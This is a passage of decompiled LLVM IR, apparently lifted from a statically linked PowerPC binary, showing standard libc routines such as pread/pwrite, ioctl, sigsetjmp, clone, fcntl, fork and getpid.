  %v0_10018718 = phi i32 [ %v0_10018718.pre, %dec_label_pc_10018708 ], [ -1, %dec_label_pc_10018710 ]
  ret i32 %v0_10018718

; uselistorder directives
  uselistorder i32* %r28.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10018714, { 1, 0 }
  uselistorder label %dec_label_pc_100186cc, { 1, 0 }
  uselistorder label %dec_label_pc_100186a0, { 1, 0 }
  uselistorder label %dec_label_pc_1001867c, { 1, 0 }
}

define i32 @__libc_pwrite64() local_unnamed_addr {
entry:
  store i32 1, i32* @r9, align 4
  %v1_10018730 = call i32 @__fake_pread_write64(i32 1)
  ret i32 %v1_10018730
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 0, i32* @r9, align 4
  %v1_10018738 = call i32 @__fake_pread_write64(i32 0)
  ret i32 %v1_10018738

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10018748 = load i32, i32* @r4, align 4
  store i32 %v0_10018748, i32* %r28.global-to-local, align 4
  %v0_1001875c = load i32, i32* @r6, align 4
  store i32 %v0_1001875c, i32* @r31, align 4
  %v0_10018760 = load i32, i32* @r7, align 4
  store i32 %v0_10018760, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 268535660, i32* @lr, align 4
  %v3_10018768 = call i32 @__GI___libc_lseek(i32 0, i32 1, i32 1)
  %v3_1001876c = icmp eq i32 %v3_10018768, -1
  store i32 %v3_10018768, i32* %r26.global-to-local, align 4
  br i1 %v3_1001876c, label %dec_label_pc_100187f4, label %dec_label_pc_10018778

dec_label_pc_10018778:                            ; preds = %entry
  %v0_10018778 = load i32, i32* @r31, align 4
  %v0_1001877c = load i32, i32* %r29.global-to-local, align 4
  store i32 268535688, i32* @lr, align 4
  %v3_10018784 = call i32 @__GI___libc_lseek(i32 %v0_1001877c, i32 %v0_10018778, i32 0)
  %v3_10018788 = icmp eq i32 %v3_10018784, -1
  br i1 %v3_10018788, label %dec_label_pc_100187f4, label %dec_label_pc_10018790

dec_label_pc_10018790:                            ; preds = %dec_label_pc_10018778
  %v0_10018790 = load i32, i32* %r30.global-to-local, align 4
  %v3_10018790 = icmp eq i32 %v0_10018790, 1
  %v0_100187a0 = load i32, i32* %r29.global-to-local, align 4
  br i1 %v3_10018790, label %dec_label_pc_10018798, label %dec_label_pc_100187ac

dec_label_pc_10018798:                            ; preds = %dec_label_pc_10018790
  %v0_10018798 = load i32, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100187a8.1126 to i32), i32* @lr, align 4
  %v2_100187a4 = call i32 @__libc_write(i32 %v0_100187a0, i32 %v0_10018798)
  br label %dec_label_pc_100187bc

dec_label_pc_100187ac:                            ; preds = %dec_label_pc_10018790
  store i32 268535740, i32* @lr, align 4
  %v1_100187b8 = call i32 @__libc_read(i32 %v0_100187a0)
  br label %dec_label_pc_100187bc

dec_label_pc_100187bc:                            ; preds = %dec_label_pc_10018798, %dec_label_pc_100187ac
  %storemerge = phi i32 [ %v1_100187b8, %dec_label_pc_100187ac ], [ %v2_100187a4, %dec_label_pc_10018798 ]
  store i32 %storemerge, i32* %r30.global-to-local, align 4
  %v0_100187c0 = call i32 @__errno_location()
  store i32 %v0_100187c0, i32* @r31, align 4
  %v0_100187c8 = load i32, i32* %r26.global-to-local, align 4
  %v0_100187cc = load i32, i32* %r29.global-to-local, align 4
  %v1_100187d4 = inttoptr i32 %v0_100187c0 to i32*
  %v2_100187d4 = load i32, i32* %v1_100187d4, align 4
  store i32 %v2_100187d4, i32* %r29.global-to-local, align 4
  store i32 268535772, i32* @lr, align 4
  %v3_100187d8 = call i32 @__GI___libc_lseek(i32 %v0_100187cc, i32 %v0_100187c8, i32 0)
  %v3_100187dc = icmp eq i32 %v3_100187d8, -1
  br i1 %v3_100187dc, label %dec_label_pc_100187e4, label %dec_label_pc_100187ec

dec_label_pc_100187e4:                            ; preds = %dec_label_pc_100187bc
  %v0_100187e4 = load i32, i32* %r30.global-to-local, align 4
  %v3_100187e4 = icmp eq i32 %v0_100187e4, -1
  br i1 %v3_100187e4, label %dec_label_pc_100187ec, label %dec_label_pc_100187f4

dec_label_pc_100187ec:                            ; preds = %dec_label_pc_100187e4, %dec_label_pc_100187bc
  %v0_100187ec = load i32, i32* %r29.global-to-local, align 4
  %v1_100187ec = load i32, i32* @r31, align 4
  %v2_100187ec = inttoptr i32 %v1_100187ec to i32*
  store i32 %v0_100187ec, i32* %v2_100187ec, align 4
  %v0_100187fc.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100187f8

dec_label_pc_100187f4:                            ; preds = %dec_label_pc_100187e4, %dec_label_pc_10018778, %entry
  store i32 -1, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100187f8

dec_label_pc_100187f8:                            ; preds = %dec_label_pc_100187ec, %dec_label_pc_100187f4
  %v0_100187fc = phi i32 [ %v0_100187fc.pre, %dec_label_pc_100187ec ], [ -1, %dec_label_pc_100187f4 ]
  ret i32 %v0_100187fc

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100187f8, { 1, 0 }
  uselistorder label %dec_label_pc_100187bc, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 1, i32* @r7, align 4
  %v1_10018814 = call i32 @__fake_pread_write(i32 1)
  ret i32 %v1_10018814
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r7, align 4
  %v1_1001881c = call i32 @__fake_pread_write(i32 0)
  ret i32 %v1_1001881c

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @ioctl() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 -2143521772, i32* @r10, align 4
  %v0_10018830 = load i32, i32* @r4, align 4
  %v4_10018830 = icmp eq i32 %v0_10018830, -2143521772
  %v2_10018844 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10018844, i32* %stack_var_-32, align 4
  %v0_10018854 = load i32, i32* @r5, align 4
  br i1 %v4_10018830, label %dec_label_pc_100188a4, label %dec_label_pc_10018864

dec_label_pc_10018864:                            ; preds = %entry
  %v3_10018864 = icmp ugt i32 %v0_10018830, -2143521772
  br i1 %v3_10018864, label %dec_label_pc_1001887c, label %dec_label_pc_1001886c

dec_label_pc_1001886c:                            ; preds = %dec_label_pc_10018864
  %v3_10018870 = icmp eq i32 %v0_10018830, 1077703699
  br i1 %v3_10018870, label %dec_label_pc_10018898, label %dec_label_pc_100188c4

dec_label_pc_1001887c:                            ; preds = %dec_label_pc_10018864
  %v1_1001887c = xor i32 %v0_10018830, -2143551488
  %v3_10018880 = icmp eq i32 %v1_1001887c, 29717
  br i1 %v3_10018880, label %dec_label_pc_100188b4, label %dec_label_pc_10018888

dec_label_pc_10018888:                            ; preds = %dec_label_pc_1001887c
  %v3_1001888c = icmp eq i32 %v1_1001887c, 29718
  br i1 %v3_1001888c, label %dec_label_pc_100188bc, label %dec_label_pc_100188c4

dec_label_pc_10018898:                            ; preds = %dec_label_pc_1001886c
  store i32 ptrtoint (i32* @global_var_100188a0.1127 to i32), i32* @lr, align 4
  %v1_1001889c = inttoptr i32 %v0_10018854 to i32*
  %v2_1001889c = call i32 @__GI_tcgetattr(i32* %v1_1001889c)
  br label %dec_label_pc_100188ac

dec_label_pc_100188a4:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_100188a8

dec_label_pc_100188a8:                            ; preds = %dec_label_pc_100188bc, %dec_label_pc_100188b4, %dec_label_pc_100188a4
  store i32 268535980, i32* @lr, align 4
  %v0_100188a8 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_100188ac

dec_label_pc_100188ac:                            ; preds = %dec_label_pc_10018898, %dec_label_pc_100188a8
  %storemerge = phi i32 [ %v0_100188a8, %dec_label_pc_100188a8 ], [ %v2_1001889c, %dec_label_pc_10018898 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100188f0

dec_label_pc_100188b4:                            ; preds = %dec_label_pc_1001887c
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_100188a8

dec_label_pc_100188bc:                            ; preds = %dec_label_pc_10018888
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_100188a8

dec_label_pc_100188c4:                            ; preds = %dec_label_pc_10018888, %dec_label_pc_1001886c
  %v0_100188d4 = call i32 @__asm_mfcr()
  %v1_100188d8 = and i32 %v0_100188d4, 268435456
  %v3_100188d8 = icmp eq i32 %v1_100188d8, 0
  store i32 %v0_100188d4, i32* %r31.global-to-local, align 4
  br i1 %v3_100188d8, label %dec_label_pc_100188f0, label %dec_label_pc_100188e4

dec_label_pc_100188e4:                            ; preds = %dec_label_pc_100188c4
  %v0_100188e4 = call i32 @__errno_location()
  %v0_100188e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100188e8 = inttoptr i32 %v0_100188e4 to i32*
  store i32 %v0_100188e8, i32* %v2_100188e8, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100188f0

dec_label_pc_100188f0:                            ; preds = %dec_label_pc_100188c4, %dec_label_pc_100188ac, %dec_label_pc_100188e4
  %v0_100188f4 = phi i32 [ %v0_100188d4, %dec_label_pc_100188c4 ], [ %storemerge, %dec_label_pc_100188ac ], [ -1, %dec_label_pc_100188e4 ]
  ret i32 %v0_100188f4

; uselistorder directives
  uselistorder i32 %v0_10018830, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100188f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100188ac, { 1, 0 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 0, i32* %r14.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_10018908 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v3_10018908, i32* %arg1, align 4
  %v0_1001890c = load i32, i32* @lr, align 4
  store i32 %v0_1001890c, i32* %r0.global-to-local, align 4
  %v0_10018910 = load i32, i32* @r2, align 4
  %v2_10018910 = add i32 %tmp, 4
  %v3_10018910 = inttoptr i32 %v2_10018910 to i32*
  store i32 %v0_10018910, i32* %v3_10018910, align 4
  %v0_10018914 = load i32, i32* %r14.global-to-local, align 4
  %v2_10018914 = add i32 %tmp, 12
  %v3_10018914 = inttoptr i32 %v2_10018914 to i32*
  store i32 %v0_10018914, i32* %v3_10018914, align 4
  %v0_1001891c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001891c = add i32 %tmp, 8
  %v3_1001891c = inttoptr i32 %v2_1001891c to i32*
  store i32 %v0_1001891c, i32* %v3_1001891c, align 4
  %v0_10018920 = load i32, i32* %r15.global-to-local, align 4
  %v2_10018920 = add i32 %tmp, 16
  %v3_10018920 = inttoptr i32 %v2_10018920 to i32*
  store i32 %v0_10018920, i32* %v3_10018920, align 4
  %v0_10018928 = call i32 @__asm_mfcr()
  store i32 %v0_10018928, i32* @r3, align 4
  store i32 %v0_10018928, i32* %r0.global-to-local, align 4
  %v0_1001892c = load i32, i32* @r16, align 4
  %v2_1001892c = add i32 %v0_10018928, 20
  %v3_1001892c = inttoptr i32 %v2_1001892c to i32*
  store i32 %v0_1001892c, i32* %v3_1001892c, align 4
  %v2_10018934 = add i32 %v0_10018928, 84
  %v3_10018934 = inttoptr i32 %v2_10018934 to i32*
  store i32 %v0_10018928, i32* %v3_10018934, align 4
  %v0_10018938 = load i32, i32* @r17, align 4
  %v2_10018938 = add i32 %v0_10018928, 24
  %v3_10018938 = inttoptr i32 %v2_10018938 to i32*
  store i32 %v0_10018938, i32* %v3_10018938, align 4
  %v0_10018940 = load i32, i32* @r18, align 4
  %v2_10018940 = add i32 %v0_10018928, 28
  %v3_10018940 = inttoptr i32 %v2_10018940 to i32*
  store i32 %v0_10018940, i32* %v3_10018940, align 4
  %v0_10018948 = load i32, i32* @r19, align 4
  %v2_10018948 = add i32 %v0_10018928, 32
  %v3_10018948 = inttoptr i32 %v2_10018948 to i32*
  store i32 %v0_10018948, i32* %v3_10018948, align 4
  %v0_10018950 = load i32, i32* @r20, align 4
  %v2_10018950 = add i32 %v0_10018928, 36
  %v3_10018950 = inttoptr i32 %v2_10018950 to i32*
  store i32 %v0_10018950, i32* %v3_10018950, align 4
  %v0_10018958 = load i32, i32* @r21, align 4
  %v2_10018958 = add i32 %v0_10018928, 40
  %v3_10018958 = inttoptr i32 %v2_10018958 to i32*
  store i32 %v0_10018958, i32* %v3_10018958, align 4
  %v0_10018960 = load i32, i32* @r22, align 4
  %v2_10018960 = add i32 %v0_10018928, 44
  %v3_10018960 = inttoptr i32 %v2_10018960 to i32*
  store i32 %v0_10018960, i32* %v3_10018960, align 4
  %v0_10018968 = load i32, i32* @r23, align 4
  %v2_10018968 = add i32 %v0_10018928, 48
  %v3_10018968 = inttoptr i32 %v2_10018968 to i32*
  store i32 %v0_10018968, i32* %v3_10018968, align 4
  %v0_10018970 = load i32, i32* @r24, align 4
  %v2_10018970 = add i32 %v0_10018928, 52
  %v3_10018970 = inttoptr i32 %v2_10018970 to i32*
  store i32 %v0_10018970, i32* %v3_10018970, align 4
  %v0_10018978 = load i32, i32* @r25, align 4
  %v2_10018978 = add i32 %v0_10018928, 56
  %v3_10018978 = inttoptr i32 %v2_10018978 to i32*
  store i32 %v0_10018978, i32* %v3_10018978, align 4
  %v0_10018980 = load i32, i32* @r26, align 4
  %v2_10018980 = add i32 %v0_10018928, 60
  %v3_10018980 = inttoptr i32 %v2_10018980 to i32*
  store i32 %v0_10018980, i32* %v3_10018980, align 4
  %v0_10018988 = load i32, i32* @r27, align 4
  %v2_10018988 = add i32 %v0_10018928, 64
  %v3_10018988 = inttoptr i32 %v2_10018988 to i32*
  store i32 %v0_10018988, i32* %v3_10018988, align 4
  %v0_10018990 = load i32, i32* @r28, align 4
  %v2_10018990 = add i32 %v0_10018928, 68
  %v3_10018990 = inttoptr i32 %v2_10018990 to i32*
  store i32 %v0_10018990, i32* %v3_10018990, align 4
  %v0_10018998 = load i32, i32* @r29, align 4
  %v2_10018998 = add i32 %v0_10018928, 72
  %v3_10018998 = inttoptr i32 %v2_10018998 to i32*
  store i32 %v0_10018998, i32* %v3_10018998, align 4
  %v0_100189a0 = load i32, i32* @r30, align 4
  %v2_100189a0 = add i32 %v0_10018928, 76
  %v3_100189a0 = inttoptr i32 %v2_100189a0 to i32*
  store i32 %v0_100189a0, i32* %v3_100189a0, align 4
  %v0_100189a8 = load i32, i32* @r31, align 4
  %v2_100189a8 = add i32 %v0_10018928, 80
  %v3_100189a8 = inttoptr i32 %v2_100189a8 to i32*
  store i32 %v0_100189a8, i32* %v3_100189a8, align 4
  %v0_100189b0 = call i32 @__sigjmp_save()
  ret i32 %v0_100189b0

; uselistorder directives
  uselistorder i32 %v0_10018928, { 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 2, 3, 4, 16, 5, 17, 19, 18 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 72, { 1, 0 }
  uselistorder i32 68, { 1, 0, 2, 3 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %v0_100189bc = load i32, i32* @r2, align 4
  %v3_100189bc = call %1 @__asm_cror(i32 %v0_100189bc, i32 %arg4, i32 %v0_100189bc)
  %v6_100189bc = extractvalue %1 %v3_100189bc, 2
  br i1 %v6_100189bc, label %dec_label_pc_10018a20, label %dec_label_pc_100189c4

dec_label_pc_100189c4:                            ; preds = %entry
  %v1_100189cc = call i32 @__asm_rlwinm(i32 %arg2, i32 0, i32 0, i32 27)
  %v2_100189d4 = add i32 %v1_100189cc, -16
  %v3_100189d4 = inttoptr i32 %v2_100189d4 to i32*
  store i32 0, i32* %v3_100189d4, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %v2_100189d4, i32* @r30, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg3, i32* @r3, align 4
  %v3_100189f0 = icmp eq i32 %arg3, 0
  %v3_100189f4 = call %2 @__asm_crandc(i32 %arg4, i32 %arg4, i32 %arg3)
  %v7_100189f4 = extractvalue %2 %v3_100189f4, 3
  br i1 %v3_100189f0, label %dec_label_pc_100189fc, label %dec_label_pc_10018a10

dec_label_pc_100189fc:                            ; preds = %dec_label_pc_100189c4
  %v0_10018a00 = load i32, i32* %r29.global-to-local, align 4
  %v0_10018a04 = load i32, i32* @r31, align 4
  call void @__pseudo_call(i32 %v0_10018a00)
  %v1_10018a0c = call i32 @__GI__exit(i32 %v0_10018a04)
  store i32 %v1_10018a0c, i32* @r3, align 4
  %v1_10018a18.pre = load i1, i1* @cr0_so, align 1
  br label %dec_label_pc_10018a10

dec_label_pc_10018a10:                            ; preds = %dec_label_pc_100189c4, %dec_label_pc_100189fc
  %v1_10018a18 = phi i1 [ %v7_100189f4, %dec_label_pc_100189c4 ], [ %v1_10018a18.pre, %dec_label_pc_100189fc ]
  %v2_10018a18 = xor i1 %v1_10018a18, true
  call void @__pseudo_cond_branch(i1 %v2_10018a18, i32 ptrtoint (i32* @global_var_10018a0c.1128 to i32))
  %v0_10018a1c = call i32 @__syscall_error()
  br label %dec_label_pc_10018a20

dec_label_pc_10018a20:                            ; preds = %entry, %dec_label_pc_10018a10
  store i32 22, i32* @r3, align 4
  %v0_10018a24 = call i32 @__syscall_error()
  ret i32 %v0_10018a24

; uselistorder directives
  uselistorder i32* @r2, { 33, 32, 56, 21, 57, 13, 50, 44, 43, 0, 14, 15, 16, 1, 2, 3, 4, 17, 18, 5, 19, 20, 22, 23, 45, 46, 58, 59, 48, 49, 24, 25, 6, 7, 26, 27, 51, 53, 54, 8, 42, 28, 29, 40, 41, 39, 60, 61, 62, 55, 52, 30, 47, 9, 10, 11, 12, 36, 65, 34, 35, 37, 31, 38, 64, 63 }
  uselistorder i32 %arg4, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10018a20, { 1, 0 }
  uselistorder label %dec_label_pc_10018a10, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10018a3c = add i32 %arg2, -12
  %v2_10018a40 = icmp ugt i32 %v1_10018a3c, 2
  %v2_10018a48 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10018a48, i32* %stack_var_-32, align 4
  br i1 %v2_10018a40, label %dec_label_pc_10018a74, label %dec_label_pc_10018a64

dec_label_pc_10018a64:                            ; preds = %entry
  store i32 268536428, i32* @lr, align 4
  %v2_10018a68 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_10018a68, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10018a94

dec_label_pc_10018a74:                            ; preds = %entry
  %v0_10018a78 = call i32 @__asm_mfcr()
  %v1_10018a7c = and i32 %v0_10018a78, 268435456
  %v3_10018a7c = icmp eq i32 %v1_10018a7c, 0
  store i32 %v0_10018a78, i32* %r31.global-to-local, align 4
  br i1 %v3_10018a7c, label %dec_label_pc_10018a94, label %dec_label_pc_10018a88

dec_label_pc_10018a88:                            ; preds = %dec_label_pc_10018a74
  %v0_10018a88 = call i32 @__errno_location()
  %v0_10018a8c = load i32, i32* %r31.global-to-local, align 4
  %v2_10018a8c = inttoptr i32 %v0_10018a88 to i32*
  store i32 %v0_10018a8c, i32* %v2_10018a8c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10018a94

dec_label_pc_10018a94:                            ; preds = %dec_label_pc_10018a74, %dec_label_pc_10018a64, %dec_label_pc_10018a88
  %v0_10018a98 = phi i32 [ %v0_10018a78, %dec_label_pc_10018a74 ], [ %v2_10018a68, %dec_label_pc_10018a64 ], [ -1, %dec_label_pc_10018a88 ]
  ret i32 %v0_10018a98

; uselistorder directives
  uselistorder label %dec_label_pc_10018a94, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10018ac4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10018ac4, i32* %stack_var_-32, align 4
  %v0_10018ae0 = call i32 @__asm_mfcr()
  %v1_10018ae4 = and i32 %v0_10018ae0, 268435456
  %v3_10018ae4 = icmp eq i32 %v1_10018ae4, 0
  store i32 %v0_10018ae0, i32* %r31.global-to-local, align 4
  br i1 %v3_10018ae4, label %dec_label_pc_10018afc, label %dec_label_pc_10018af0

dec_label_pc_10018af0:                            ; preds = %entry
  %v0_10018af0 = call i32 @__errno_location()
  %v0_10018af4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018af4 = inttoptr i32 %v0_10018af0 to i32*
  store i32 %v0_10018af4, i32* %v2_10018af4, align 4
  br label %dec_label_pc_10018afc

dec_label_pc_10018afc:                            ; preds = %entry, %dec_label_pc_10018af0
  %v0_10018b0c = phi i32 [ %v0_10018ae0, %entry ], [ -1, %dec_label_pc_10018af0 ]
  ret i32 %v0_10018b0c

; uselistorder directives
  uselistorder label %dec_label_pc_10018afc, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10018b24

dec_label_pc_10018b24:                            ; preds = %dec_label_pc_10018b24.backedge, %entry
  %v0_10018b30 = call i32 @__asm_mfcr()
  %v1_10018b34 = and i32 %v0_10018b30, 268435456
  %v3_10018b34 = icmp eq i32 %v1_10018b34, 0
  store i32 %v0_10018b30, i32* %r31.global-to-local, align 4
  br i1 %v3_10018b34, label %dec_label_pc_10018b24.backedge, label %dec_label_pc_10018b40

dec_label_pc_10018b40:                            ; preds = %dec_label_pc_10018b24
  %v0_10018b40 = call i32 @__errno_location()
  %v0_10018b44 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018b44 = inttoptr i32 %v0_10018b40 to i32*
  store i32 %v0_10018b44, i32* %v2_10018b44, align 4
  br label %dec_label_pc_10018b24.backedge

dec_label_pc_10018b24.backedge:                   ; preds = %dec_label_pc_10018b40, %dec_label_pc_10018b24
  br label %dec_label_pc_10018b24
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018b64 = call i32 @__asm_mfcr()
  %v1_10018b68 = and i32 %v0_10018b64, 268435456
  %v3_10018b68 = icmp eq i32 %v1_10018b68, 0
  store i32 %v0_10018b64, i32* %r31.global-to-local, align 4
  br i1 %v3_10018b68, label %dec_label_pc_10018b80, label %dec_label_pc_10018b74

dec_label_pc_10018b74:                            ; preds = %entry
  %v0_10018b74 = call i32 @__errno_location()
  %v0_10018b78 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018b78 = inttoptr i32 %v0_10018b74 to i32*
  store i32 %v0_10018b78, i32* %v2_10018b78, align 4
  br label %dec_label_pc_10018b80

dec_label_pc_10018b80:                            ; preds = %entry, %dec_label_pc_10018b74
  %v0_10018b90 = phi i32 [ %v0_10018b64, %entry ], [ -1, %dec_label_pc_10018b74 ]
  ret i32 %v0_10018b90

; uselistorder directives
  uselistorder label %dec_label_pc_10018b80, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018bac = call i32 @__asm_mfcr()
  %v1_10018bb0 = and i32 %v0_10018bac, 268435456
  %v3_10018bb0 = icmp eq i32 %v1_10018bb0, 0
  store i32 %v0_10018bac, i32* %r31.global-to-local, align 4
  br i1 %v3_10018bb0, label %dec_label_pc_10018bc8, label %dec_label_pc_10018bbc

dec_label_pc_10018bbc:                            ; preds = %entry
  %v0_10018bbc = call i32 @__errno_location()
  %v0_10018bc0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018bc0 = inttoptr i32 %v0_10018bbc to i32*
  store i32 %v0_10018bc0, i32* %v2_10018bc0, align 4
  br label %dec_label_pc_10018bc8

dec_label_pc_10018bc8:                            ; preds = %entry, %dec_label_pc_10018bbc
  %v0_10018bd8 = phi i32 [ %v0_10018bac, %entry ], [ -1, %dec_label_pc_10018bbc ]
  ret i32 %v0_10018bd8

; uselistorder directives
  uselistorder label %dec_label_pc_10018bc8, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018bf4 = call i32 @__asm_mfcr()
  %v1_10018bf8 = and i32 %v0_10018bf4, 268435456
  %v3_10018bf8 = icmp eq i32 %v1_10018bf8, 0
  store i32 %v0_10018bf4, i32* %r31.global-to-local, align 4
  br i1 %v3_10018bf8, label %dec_label_pc_10018c10, label %dec_label_pc_10018c04

dec_label_pc_10018c04:                            ; preds = %entry
  %v0_10018c04 = call i32 @__errno_location()
  %v0_10018c08 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018c08 = inttoptr i32 %v0_10018c04 to i32*
  store i32 %v0_10018c08, i32* %v2_10018c08, align 4
  br label %dec_label_pc_10018c10

dec_label_pc_10018c10:                            ; preds = %entry, %dec_label_pc_10018c04
  %v0_10018c20 = phi i32 [ %v0_10018bf4, %entry ], [ -1, %dec_label_pc_10018c04 ]
  ret i32 %v0_10018c20

; uselistorder directives
  uselistorder label %dec_label_pc_10018c10, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10018c30 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268536892, i32* @lr, align 4
  %v2_10018c38 = call i32 @getrlimit(i32 7, i32 %v2_10018c30)
  %v1_10018c3c = icmp slt i32 %v2_10018c38, 0
  br i1 %v1_10018c3c, label %dec_label_pc_10018c4c, label %dec_label_pc_10018c48

dec_label_pc_10018c48:                            ; preds = %entry
  %v3_10018c48 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10018c4c

dec_label_pc_10018c4c:                            ; preds = %entry, %dec_label_pc_10018c48
  %v0_10018c58 = phi i32 [ 256, %entry ], [ %v3_10018c48, %dec_label_pc_10018c48 ]
  ret i32 %v0_10018c58

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_10018c4c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018c74 = call i32 @__asm_mfcr()
  %v1_10018c78 = and i32 %v0_10018c74, 268435456
  %v3_10018c78 = icmp eq i32 %v1_10018c78, 0
  store i32 %v0_10018c74, i32* %r31.global-to-local, align 4
  br i1 %v3_10018c78, label %dec_label_pc_10018c90, label %dec_label_pc_10018c84

dec_label_pc_10018c84:                            ; preds = %entry
  %v0_10018c84 = call i32 @__errno_location()
  %v0_10018c88 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018c88 = inttoptr i32 %v0_10018c84 to i32*
  store i32 %v0_10018c88, i32* %v2_10018c88, align 4
  br label %dec_label_pc_10018c90

dec_label_pc_10018c90:                            ; preds = %entry, %dec_label_pc_10018c84
  %v0_10018ca0 = phi i32 [ %v0_10018c74, %entry ], [ -1, %dec_label_pc_10018c84 ]
  ret i32 %v0_10018ca0

; uselistorder directives
  uselistorder label %dec_label_pc_10018c90, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10018cac = load i32, i32* @global_var_10045254.1006, align 4
  %v3_10018cb0 = icmp eq i32 %v3_10018cac, 0
  %v0_10018cb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10018cb0, i32 %v0_10018cb4)
  ret i32 %v3_10018cac
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018cd8 = call i32 @__asm_mfcr()
  %v1_10018cdc = and i32 %v0_10018cd8, 268435456
  %v3_10018cdc = icmp eq i32 %v1_10018cdc, 0
  store i32 %v0_10018cd8, i32* %r31.global-to-local, align 4
  br i1 %v3_10018cdc, label %dec_label_pc_10018cf4, label %dec_label_pc_10018ce8

dec_label_pc_10018ce8:                            ; preds = %entry
  %v0_10018ce8 = call i32 @__errno_location()
  %v0_10018cec = load i32, i32* %r31.global-to-local, align 4
  %v2_10018cec = inttoptr i32 %v0_10018ce8 to i32*
  store i32 %v0_10018cec, i32* %v2_10018cec, align 4
  br label %dec_label_pc_10018cf4

dec_label_pc_10018cf4:                            ; preds = %entry, %dec_label_pc_10018ce8
  %v0_10018d04 = phi i32 [ %v0_10018cd8, %entry ], [ -1, %dec_label_pc_10018ce8 ]
  ret i32 %v0_10018d04

; uselistorder directives
